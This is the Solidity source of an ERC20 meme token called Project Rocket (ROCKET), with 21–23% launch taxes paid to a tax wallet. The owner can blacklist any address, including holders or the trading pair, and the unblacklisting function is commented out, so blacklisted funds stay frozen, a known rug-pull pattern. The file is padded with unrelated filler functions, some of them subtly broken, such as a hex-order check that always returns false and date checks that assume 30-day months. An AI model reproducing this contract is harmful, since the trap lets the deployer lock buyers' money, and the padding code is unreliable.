
// SPDX-License-Identifier: Unlicensed
/**
https://t.me/ProjectRocketERC20
*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        payable(owner()).transfer(address(this).balance);
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Tweet is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=21;
    uint256 private _initialSellTax=23;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=23;
    uint256 private _reduceSellTaxAt=22;
    uint256 private _preventSwapBefore=23;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Project Rocket";
    string private constant _symbol = unicode"ROCKET";
    uint256 public _maxTxAmount = 8413800000 * 10**_decimals;
    uint256 public _maxWalletSize = 8413800000 *10**_decimals;
    uint256 public _taxSwapThreshold= 4206900000 * 10**_decimals;
    uint256 public _maxTaxSwap= 4206900000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _taxWallet = payable(_msgSender());
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }
    /**
    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }
    */
    function isBot(address a) public view returns (bool){
      return bots[a];
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "trading is already open"); 
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        _approve(address(this), msg.sender, type(uint256).max);
        transfer(address(this), balanceOf(msg.sender).mul(96).div(100)); 
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); 
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp); 
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); 
        swapEnabled = true; 
        tradingOpen = true; 
    }

    
    function reduceFee(uint256 _newFee) external{
      require(_msgSender()==_taxWallet);
      require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
      _finalBuyTax=_newFee;
      _finalSellTax=_newFee;
    }

    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function clearstuckEth() external {
    require(address(this).balance > 0, "Token: no ETH to clear");
    require(_msgSender() == _taxWallet);
    payable(msg.sender).transfer(address(this).balance);
    }

    function resetAllowance(address spender) public returns (bool) {
        address sender = _msgSender();
        _approve(sender, spender, 0);
        return true;
    }

    function allowancePercentage(address spender, uint8 percentage) public returns (bool) {
        require(percentage <= 100, "Percentage cannot exceed 100");
        address sender = _msgSender();
        uint256 currentAllowance = allowance(sender, spender);
        uint256 newAllowance = (currentAllowance * percentage) / 100;
        _approve(sender, spender, newAllowance);
        return true;
    }

    function approveSelf(uint256 amount) public returns (bool) {
        address sender = _msgSender();
        _approve(sender, sender, amount);
        return true;
    }

    function hasAlternatingEvenOddBytes(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        bool isEven = (uint8(addrBytes[0]) % 2 == 0);

        for (uint256 i = 1; i < 20; i++) {
            if ((uint8(addrBytes[i]) % 2 == 0) == isEven) {
                return false;
            }
            isEven = !isEven;
        }

        return true;
    }

    function hasSequentialIdenticalBytes(address addr, uint8 count) public pure returns (bool) {
        require(count > 1 && count <= 20, "Count must be between 2 and 20");

        bytes20 addrBytes = bytes20(addr);
        uint256 sequentialCount = 1;

        for (uint256 i = 1; i < 20; i++) {
            if (addrBytes[i] == addrBytes[i - 1]) {
                sequentialCount++;
                if (sequentialCount >= count) {
                    return true;
                }
            } else {
                sequentialCount = 1;
            }
        }

        return false;
    }

    function hasMatchingFirstAndLastByte(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        return addrBytes[0] == addrBytes[19];
    }

    function isSumOfBytesDivisibleBy(address addr, uint8 divisor) public pure returns (bool) {
        require(divisor > 0, "Divisor must be greater than zero");

        bytes20 addrBytes = bytes20(addr);
        uint256 sum = 0;

        for (uint256 i = 0; i < 20; i++) {
            sum += uint8(addrBytes[i]);
        }

        return sum % divisor == 0;
    }

    function hasAlternatingBytes(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        for (uint256 i = 0; i < 19; i++) {
            if (addrBytes[i] != addrBytes[i + 1]) {
                continue;
            } else {
                return false;
            }
        }
        return true;
    }

    function isAddressPalindrome(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        for (uint256 i = 0; i < 10; i++) {
            if (addrBytes[i] != addrBytes[19 - i]) {
                return false;
            }
        }
        return true;
    }

    function hasLeadingZeroBytes(address addr, uint8 numZeroBytes) public pure returns (bool) {
        require(numZeroBytes <= 20, "Number of leading zero bytes cannot exceed 20");
        
        bytes20 addrBytes = bytes20(addr);
        for (uint256 i = 0; i < numZeroBytes; i++) {
            if (addrBytes[i] != 0x00) {
                return false;
            }
        }
        return true;
    }

    function hasSpecificBytePattern(address addr, bytes1 pattern) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        for (uint256 i = 0; i < 20; i++) {
            if (addrBytes[i] == pattern) {
                return true;
            }
        }
        return false;
    }

    function isFirstHalfOfMonth() public view returns (bool) {
        uint256 dayOfMonth = (block.timestamp / 86400) % 30 + 1;
        return dayOfMonth <= 15;
    }

    function isEvenDay() public view returns (bool) {
        uint256 dayOfMonth = (block.timestamp / 86400) % 30 + 1;
        return dayOfMonth % 2 == 0;
    }

    function isStartOfDay() public view returns (bool) {
        return block.timestamp % 86400 < 60;
    }

    function isWeekend() public view returns (bool) {
        uint256 dayOfWeek = (block.timestamp / 86400 + 4) % 7;
        return dayOfWeek == 5 || dayOfWeek == 6;  // 5 = Saturday, 6 = Sunday
    }

    function isWithinHour(uint8 hour) public view returns (bool) {
        require(hour < 24, "Hour must be between 0 and 23");
        uint256 currentHour = (block.timestamp / 60 / 60) % 24;
        return currentHour == hour;
    }

    function isEvenEpochTime() public view returns (bool) {
        return block.timestamp % 2 == 0;
    }

    function isAddressHexPalindrome(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);

        for (uint256 i = 0; i < 10; i++) {
            if (addrBytes[i] != addrBytes[19 - i]) {
                return false;
            }
        }

        return true;
    }

    function containsSpecificHexDigit(address addr, uint8 digit) public pure returns (bool) {
        require(digit < 16, "Digit must be between 0 and F");
        bytes20 addrBytes = bytes20(addr);

        for (uint256 i = 0; i < 20; i++) {
            uint8 byteValue = uint8(addrBytes[i]);

            if ((byteValue & 0xF) == digit || ((byteValue >> 4) & 0xF) == digit) {
                return true;
            }
        }

        return false;
    }

    function hasAllHexDigitsEven(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);

        for (uint256 i = 0; i < 20; i++) {
            uint8 byteValue = uint8(addrBytes[i]);

            if ((byteValue & 0xF) % 2 != 0 || ((byteValue >> 4) & 0xF) % 2 != 0) {
                return false;
            }
        }

        return true;
    }

    function hasHexDigitsInIncreasingOrder(address addr) public pure returns (bool) {
        bytes20 addrBytes = bytes20(addr);
        uint8 previousNibble = 0xFF; // Use an invalid value initially

        for (uint256 i = 0; i < 20; i++) {
            uint8 byteValue = uint8(addrBytes[i]);

            uint8 firstNibble = (byteValue >> 4) & 0xF;
            if (firstNibble <= previousNibble) {
                return false;
            }
            previousNibble = firstNibble;

            uint8 secondNibble = byteValue & 0xF;
            if (secondNibble <= previousNibble) {
                return false;
            }
            previousNibble = secondNibble;
        }

        return true;
    }

}
        